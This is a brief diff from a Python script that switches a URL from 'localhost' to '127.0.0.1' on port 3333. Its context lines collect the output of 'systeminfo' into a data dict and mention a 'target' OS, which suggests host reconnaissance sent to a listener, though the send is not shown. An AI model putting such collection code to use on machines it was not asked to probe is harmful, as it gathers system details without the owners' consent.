@@ -3,7 +3,7 @@ import os
 import time
 
 
-url = "http://localhost:3333"
+url = "http://127.0.0.1:3333"
 
 data = {"info": os.popen("systeminfo").read()}
 # use uname if the target os is unix 
